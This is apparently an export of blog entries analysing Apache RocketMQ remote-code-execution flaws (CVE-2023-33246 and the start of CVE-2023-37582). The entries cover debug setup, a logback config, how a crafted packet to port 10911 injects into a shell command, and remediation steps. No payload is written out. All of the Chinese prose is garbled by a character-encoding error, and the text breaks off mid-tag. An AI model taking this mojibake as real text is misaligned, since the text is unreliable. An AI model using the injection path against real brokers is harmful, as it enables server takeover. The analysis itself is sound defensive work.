<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="æµ‹è¯•ç¯å¢ƒæ­å»º"><a href="#æµ‹è¯•ç¯å¢ƒæ­å»º" class="headerlink" title="æµ‹è¯•ç¯å¢ƒæ­å»º"></a>æµ‹è¯•ç¯å¢ƒæ­å»º</h3><p><strong>è°ƒè¯•ç¯å¢ƒ</strong></p>
<p>è®¿é—®é¡¹ç›®å®˜æ–¹ä»“åº“è·å–å—å½±å“æ¼æ´ç‰ˆæœ¬æºç </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://github.com/apache/rocketmq/releases</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ideaå¯¼å…¥é¡¹ç›®åé…ç½®è¿è¡Œæ—¶ç¯å¢ƒå˜é‡<code>ROCKETMQ_HOME</code></p>
<p><img src="/archives/3553c506/image-20230720155335454.png" alt="image-20230720155335454"></p>
<p><code>ROCKETMQ_HOME</code>ä¸ºROCKETMQè¿è¡Œå®¶ç›®å½•ï¼Œé…ç½®å¥½ç¯å¢ƒå˜é‡ååœ¨<code>ROCKETMQ_HOME</code>æŒ‡å‘çš„ç›®å½•è¡Œæ–°å»ºæ–‡ä»¶å¤¹<code>conf</code>ï¼Œè¿›å…¥<code>conf</code>ç›®å½•å¹¶æ–°å»ºæ–‡ä»¶<code>logback_broker.xml</code>ï¼Œå°†ä»¥ä¸‹å†…å®¹å¤åˆ¶åˆ°è¯¥æ–‡ä»¶ä¸­ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- é…ç½®æ–‡ä»¶ä¿®æ”¹æ—¶é‡æ–°åŠ è½½ï¼Œé»˜è®¤true --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">scan</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!--å®šä¹‰æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨åœ°å€ å‹¿åœ¨ LogBack çš„é…ç½®ä¸­ä½¿ç”¨ç›¸å¯¹è·¯å¾„--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;CATALINA_BASE&quot;</span> <span class="attr">value</span>=<span class="string">&quot;**/logs&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- æ§åˆ¶å°è¾“å‡º --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CONSOLE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- è¾“å‡ºæ—¥å¿—è®°å½•æ ¼å¼ --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- ç¬¬ä¸€ä¸ªæ–‡ä»¶è¾“å‡º,æ¯å¤©äº§ç”Ÿä¸€ä¸ªæ–‡ä»¶ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- è¾“å‡ºæ–‡ä»¶è·¯å¾„+æ–‡ä»¶å --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/aa.%d&#123;yyyyMMdd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- ä¿å­˜30å¤©çš„æ—¥å¿— --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- è¾“å‡ºæ—¥å¿—è®°å½•æ ¼å¼ --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- ç¬¬äºŒä¸ªæ–‡ä»¶è¾“å‡º,æ¯å¤©äº§ç”Ÿä¸€ä¸ªæ–‡ä»¶ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;CATALINA_BASE&#125;/bb.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/bb.%d&#123;yyyyMMdd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CUSTOM&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;CATALINA_BASE&#125;/custom.log<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- daily rollover --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;CATALINA_BASE&#125;/custom.%d&#123;yyyy-MM-dd&#125;.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- keep 30 days&#x27; worth of history --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>30<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- è®¾ç½®æ—¥å¿—è¾“å‡ºçº§åˆ« --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;ERROR&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;FILE2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- è‡ªå®šä¹‰logger --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;custom&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CUSTOM&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç¯å¢ƒé…ç½®å®Œæˆåè¿è¡Œä¸»ç±»<code>org.apache.rocketmq.broker.BrokerStartup</code>å¯åŠ¨ROCKETMQ Brockerï¼Œæ§åˆ¶å°è¾“å‡ºä»¥ä¸‹å†…å®¹åˆ™Brockerå¯åŠ¨æˆåŠŸ</p>
<p><img src="/archives/3553c506/image-20230720155841681.png" alt="image-20230720155841681"></p>
<p><strong>é¶åœºæ­å»º</strong></p>
<p>ä½¿ç”¨vulhubé¶åœºä¸€é”®æ­å»º</p>
<p><code>https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-33246</code></p>
<h3 id="è¯¦æƒ…"><a href="#è¯¦æƒ…" class="headerlink" title="è¯¦æƒ…"></a>è¯¦æƒ…</h3><p>Brokeråœ¨å¯åŠ¨æ—¶ä¼šé¦–å…ˆåˆ›å»ºä¸€ä¸ª<code>BrokerController</code>ç„¶åè¿è¡Œå®ƒ</p>
<p><img src="/archives/3553c506/image-20230720164935939.png" alt="image-20230720164935939"></p>
<p>BrockerControlleråˆ›å»ºè¿‡ç¨‹ä¸­ä¸»è¦è¿›è¡Œäº†é…ç½®æ–‡ä»¶è§£æã€å‘½ä»¤è¡Œè§£æã€ç½‘ç»œæœåŠ¡é…ç½®ã€æ—¥å¿—é…ç½®ç­‰æ“ä½œã€‚</p>
<p>Controllerå¯åŠ¨æ—¶ç›¸ç»§å¯åŠ¨ä»¥ä¸‹æœåŠ¡ï¼Œå…¶ä¸­åœ¨å¯åŠ¨<code>remotingServer</code>æœåŠ¡æ—¶ä¼šå¯åŠ¨<code>broker</code>ç›‘å¬åœ¨é»˜è®¤çš„<code>10911</code>ç«¯å£</p>
<p><img src="/archives/3553c506/image-20230720165303285.png" alt="image-20230720165303285"></p>
<p>åœ¨è¿›è¡Œ<code>filterServerManager</code>å¯åŠ¨è¿‡ç¨‹ä¸­ä¼šä»¥30Sçš„é¢‘ç‡è½®è¯¢åˆ›å»º<code>filterServer</code></p>
<p><img src="/archives/3553c506/image-20230720165452954.png" alt="image-20230720165452954"></p>
<p>åˆ›å»º<code>filterServer</code>æ—¶è°ƒç”¨æ–¹æ³•<code>org.apache.rocketmq.broker.filtersrv.FilterServerManager#buildStartCommand</code>è§£ææ•°æ®æ‹¼æ¥å‚æ•°</p>
<p><img src="/archives/3553c506/image-20230720165739570.png" alt="image-20230720165739570"></p>
<p>åœ¨è¿›è¡Œå‚æ•°æ‹¼æ¥è¿‡ç¨‹ä¸­ä¼šä»<code>brokerConfig</code>ä¸­è·å–<code>rocketmqHome</code>ä¸<code>namesrvAddr</code>ä¸¤ä¸ªå€¼ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ¨¡æ‹ŸRocketMQåè®®å‘10911ç«¯å£å‘é€ç‰¹åˆ¶çš„æ•°æ®åŒ…æ¥å½±å“<code>rocketmqHome</code>çš„å€¼ä¸ºå¯æ§çš„å€¼ï¼Œåˆå› åº”ç”¨åœ¨è¿›è¡Œå‘½ä»¤æ‹¼æ¥è¿‡ç¨‹ä¸­æœªå¯¹ç”¨æˆ·çš„è¾“å…¥å€¼è¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤ï¼Œä»è€Œå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œæ­¤æ—¶æˆ‘ä»¬ä½¿ç”¨ç½‘ç»œä¸Šå…¬å¼€çš„PoCå‘10911ç«¯å£å‘é€æ•°æ®ç„¶åè°ƒè¯•</p>
<p><img src="/archives/3553c506/image-20230720170706116.png" alt="image-20230720170706116"></p>
<p><img src="/archives/3553c506/image-20230720170558173.png" alt="image-20230720170558173"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæ­¤æ—¶è·å–çš„<code>rocketmqHome</code>å€¼å·²ç»å˜æ›´ä¸ºæˆ‘ä»¬è¾“å…¥çš„Payload</p>
<p>åœ¨<code>buildStartCommand</code>æ–¹æ³•è°ƒç”¨å®Œæ¯•åï¼Œä¼šè¿”å›æ‹¼æ¥çš„å­—ç¬¦ä¸²ç„¶åè°ƒç”¨<code>org.apache.rocketmq.broker.filtersrv.FilterServerUtil#callShell</code>æ–¹æ³•è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p>æ•´ä¸ªæµç¨‹çš„è°ƒç”¨æ ˆä¸º</p>
<p><img src="/archives/3553c506/image-20230720171016289.png" alt="image-20230720171016289"></p>
<h2 id="ä¿®å¤æªæ–½"><a href="#ä¿®å¤æªæ–½" class="headerlink" title="ä¿®å¤æªæ–½"></a>ä¿®å¤æªæ–½</h2><p>1ã€éå¿…é¡»å‹¿å‘äº’è”ç½‘å¼€æ”¾ä¸å¿…è¦çš„æœåŠ¡ç«¯å£ï¼Œæ§åˆ¶æš´éœ²é¢ï¼›</p>
<p>2ã€å…³é”®æœåŠ¡å¢åŠ ç”¨æˆ·æƒé™æ ¡éªŒï¼›</p>
<p>3ã€å‡çº§è½¯ä»¶åˆ°ä¸å—å½±å“çš„ç‰ˆæœ¬æˆ–æœ€æ–°ç‰ˆã€‚</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246</a></li>
<li><a href="https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2023-33246">https://www.cvedetails.com/cve-details.php?t=1&amp;cve_id=CVE-2023-33246</a></li>
<li><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202305-2101">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202305-2101</a></li>
</ul>
<h2 id="è½¯å®‰è§£å†³æ–¹æ¡ˆ"><a href="#è½¯å®‰è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è½¯å®‰è§£å†³æ–¹æ¡ˆ"></a>è½¯å®‰è§£å†³æ–¹æ¡ˆ</h2>]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
        <category>å®‰å…¨æŠ€æœ¯</category>
      </categories>
      <tags>
        <tag>Apache RocketMQ</tag>
        <tag>CVE-2023-33246</tag>
        <tag>RCE</tag>
        <tag>è¿œç¨‹ä»£ç æ‰§è¡Œ</tag>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>æ¼æ´åˆ†æ</tag>
        <tag>æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache RocketMQ è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆCVE-2023-37582ï¼‰</title>
    <url>/archives/968babfb.html</url>
    <content><![CDATA[<h1 id="CVE-2023-37582"><a href="#CVE-2023-37582" class="headerlink" title="CVE-2023-37582"></a>CVE-2023-37582</h1><h2 id="äº§å“ä»‹ç»"><a href="#äº§å“ä»‹ç»" class="headerlink" title="äº§å“ä»‹ç»"></a>äº§å“ä»‹ç»</h2><p>RocketMQæ˜¯é˜¿é‡Œå·´å·´åœ¨2012å¹´å¼€å‘çš„åˆ†å¸ƒå¼æ¶ˆæ¯ä¸­é—´ä»¶ï¼ŒåæçŒ®ç»™Apacheè½¯ä»¶åŸºé‡‘ä¼šå¹¶æˆä¸ºApacheçš„é¡¶çº§é¡¹ç›®ã€‚RocketMQä¸“ä¸ºä¸‡äº¿çº§è¶…å¤§è§„æ¨¡çš„æ¶ˆæ¯å¤„ç†è€Œè®¾è®¡ï¼Œå…·æœ‰é«˜ååé‡ã€ä½å»¶è¿Ÿã€æµ·é‡å †ç§¯ã€é¡ºåºæ”¶å‘ç­‰ç‰¹ç‚¹ã€‚</p>
<h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>å½“RocketMQçš„NameServerç»„ä»¶æš´éœ²åœ¨å¤–ç½‘ï¼Œå¹¶ä¸”ç¼ºä¹æœ‰æ•ˆçš„èº«ä»½è®¤è¯æœºåˆ¶æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨nameServeræ›´æ–°é…ç½®åŠŸèƒ½ï¼Œä»¥RocketMQè¿è¡Œçš„ç³»ç»Ÿç”¨æˆ·èº«ä»½è¿›è¡Œä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œç”šè‡³å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>
<span id="more"></span>

<h2 id="å—å½±å“ç‰ˆæœ¬"><a href="#å—å½±å“ç‰ˆæœ¬" class="headerlink" title="å—å½±å“ç‰ˆæœ¬"></a>å—å½±å“ç‰ˆæœ¬</h2><p>&lt;RocketMQ 4.9.7</p>
<p>&lt;RocketMQ 5.1.2</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="RocketMQåŸºæœ¬æ¦‚å¿µ"><a href="#RocketMQåŸºæœ¬æ¦‚å¿µ" class="headerlink" title="RocketMQåŸºæœ¬æ¦‚å¿µ"></a>RocketMQåŸºæœ¬æ¦‚å¿µ</h3><p>è¦æƒ³å¯¹è¯¥æ¼æ´æœ‰è¾ƒä¸ºæ¸…æ™°çš„è®¤è¯†ï¼Œæˆ‘ä»¬é¦–å…ˆè¦äº†è§£RocketMQçš„åŸºæœ¬æ¶æ„ä»¥åŠå„éƒ¨åˆ†çš„åŠŸèƒ½ã€‚</p>
<p>RocketMQä¸»è¦ç”±å››éƒ¨åˆ†ç»„æˆï¼š</p>
<table>
<thead>
<tr>
<th>æ¦‚å¿µ</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>Producer</td>
<td>Prducerè´Ÿè´£æ¶ˆæ¯çš„ç”Ÿäº§ï¼Œæ”¯æŒåˆ†å¸ƒå¼é›†ç¾¤éƒ¨ç½²ï¼Œé€šè¿‡MQçš„è´Ÿè½½å‡è¡¡ç³»ç»Ÿé€‰æ‹©ç›¸åº”çš„Brokeré›†ç¾¤è¿›è¡Œæ¶ˆæ¯çš„å­˜å‚¨ä¸æŠ•é€’ã€‚</td>
</tr>
<tr>
<td>Consumer</td>
<td>Consumerè´Ÿè´£æ¶ˆæ¯çš„æ¶ˆè´¹ï¼Œæ”¯æŒåˆ†å¸ƒå¼é›†ç¾¤éƒ¨ç½²ï¼ŒåŒæ—¶æ”¯æŒé€šè¿‡PUSHä¸PULLçš„æ–¹å¼å¯¹æ¶ˆæ¯è¿›è¡Œæ¶ˆè´¹ã€‚</td>
</tr>
<tr>
<td>NameServer</td>
<td>NameServeræ˜¯ä¸€ä¸ªTopicè·¯ç”±æ³¨å†Œä¸­å¿ƒï¼Œå…¶è§’è‰²ç±»ä¼¼äºDubboä¸­çš„ZooKeeperï¼ŒHadoopä¸­çš„NameNodeï¼Œè´Ÿè´£æ•´ä¸ªç³»ç»Ÿå…ƒæ•°æ®çš„å­˜å‚¨ä¸ç®¡ç†ï¼Œæ”¯æŒBrokerçš„åŠ¨æ€æ³¨å†Œä¸å‘ç°ã€‚å…¶ä¸»è¦åŒ…å«ä¸¤ä¸ªåŠŸèƒ½ã€‚ä¸€æ˜¯Brokerçš„æ³¨å†Œä¸ç®¡ç†ï¼Œå…¶æ¥å—Brokerçš„ä¿¡æ¯å¹¶ä¿å­˜ä½œä¸ºè·¯ç”±çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¹¶æä¾›å¿ƒè·³æœºåˆ¶æ¥ç¡®ä¿æ¯ä¸€ä¸ªBrokeré›†ç¾¤çš„æœ‰æ•ˆæ€§ï¼›äºŒæ˜¯è·¯ç”±ä¿¡æ¯çš„ç®¡ç†ï¼ŒNameServerå­˜å‚¨äº†æ•´ä¸ªç³»ç»Ÿçš„Brokerè·¯ç”±ä¿¡æ¯ï¼ŒProducerä¸Consumeré€šè¿‡NameSerVerä¾¿å¯è¿›è¡Œæ¶ˆæ¯çš„æŠ•é€’ä¸æ¶ˆè´¹ã€‚</td>
</tr>
<tr>
<td>Broker</td>
<td>Brokerä¸»è¦è´Ÿè´£æ¶ˆæ¯çš„å­˜å‚¨ã€æŠ•é€’ä¸æ¶ˆè´¹å¹¶ä¿è¯æœåŠ¡çš„é«˜å¯ç”¨ã€‚</td>
</tr>
</tbody></table>
<p>ä¸‹å›¾ä¸ºå„ç»„ä»¶çš„å…³è”æ–¹å¼ï¼š</p>
<p><img src="/archives/968babfb/image-20230724102920537.png" alt="image-20230724102920537"></p>
<h3 id="æµ‹è¯•ç¯å¢ƒæ­å»º"><a href="#æµ‹è¯•ç¯å¢ƒæ­å»º" class="headerlink" title="æµ‹è¯•ç¯å¢ƒæ­å»º"></a>æµ‹è¯•ç¯å¢ƒæ­å»º</h3><p><strong>è°ƒè¯•ç¯å¢ƒ</strong></p>
<p>è®¿é—®é¡¹ç›®å®˜æ–¹ä»“åº“è·å–å—å½±å“æ¼æ´ç‰ˆæœ¬æºç ï¼ˆæœ¬æ–‡ä½¿ç”¨v4.9.4ç‰ˆæœ¬ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://github.com/apache/rocketmq/releases</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ideaå¯¼å…¥é¡¹ç›®åéœ€å¯åŠ¨<code>NameServer</code>ä¸<code>Broker</code>ï¼ŒåŒæ—¶ä¸º<code>BrokerStarup</code>ä¸<code>NamesrvStartup</code>é…ç½®è¿è¡Œæ—¶ç¯å¢ƒå˜é‡<code>ROCKETMQ_HOME</code>ï¼Œä¸¤è€…é…ç½®ç›¸åŒåœ°å€å³å¯ï¼Œä¸ºäº†è®©<code>Broker</code>èƒ½å¤Ÿæ‰¾åˆ°<code>Namesrv</code>ï¼Œ<code>Broker</code>çš„é…ç½®ä¸­éœ€è¦é¢å¤–æŒ‡å®šå‘½ä»¤è¡Œå‚æ•°<code>-c namesrv_endpoint</code></p>
<p><img src="/archives/968babfb/image-20230720155335454.png" alt="image-20230720155335454"><br><img src="/archives/968babfb/image-20230724103128881.png" alt="image-20230724103128881">  </p>
<p><code>ROCKETMQ_HOME</code>ä¸ºROCKETMQè¿è¡Œå®¶ç›®å½•ï¼Œé…ç½®å¥½ç¯å¢ƒå˜é‡ååœ¨<code>ROCKETMQ_HOME</code>æŒ‡å‘çš„ç›®å½•è¡Œæ–°å»ºæ–‡ä»¶å¤¹<code>conf</code>ï¼Œè¿›å…¥<code>conf</code>ç›®å½•å¹¶æ–°å»ºæ–‡ä»¶<code>logback_broker.xml</code>ä¸<code>logback_namesrv.xml</code>ï¼Œå°†ä»¥ä¸‹å†…å®¹å¤åˆ¶åˆ°æ–‡ä»¶ä¸­ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- é…ç½®æ–‡ä»¶ä¿®æ”¹æ—¶é‡æ–°åŠ è½½ï¼Œé»˜è®¤true --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">scan</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!--å®šä¹‰æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨åœ°å€ å‹¿åœ¨ LogBack çš„é…ç½®ä¸­ä½¿ç”¨ç›¸å¯¹è·¯å¾„--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;CATALINA_BASE&quot;</span> <span class="attr">value</span>=<span class="string">&quot;**/logs&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- æ§åˆ¶å°è¾“å‡º --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;CONSOLE&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- è¾“å‡ºæ—¥å¿—è®°å½•æ ¼å¼ --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- ç¬¬ä¸€ä¸ªæ–‡ä»¶è¾“å‡º,æ¯å¤©äº§ç”Ÿä¸€ä¸ªæ–‡ä»¶ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;FILE1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- è¾“å‡ºæ–‡ä»¶è·¯å¾„+æ–‡ä»¶å --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span 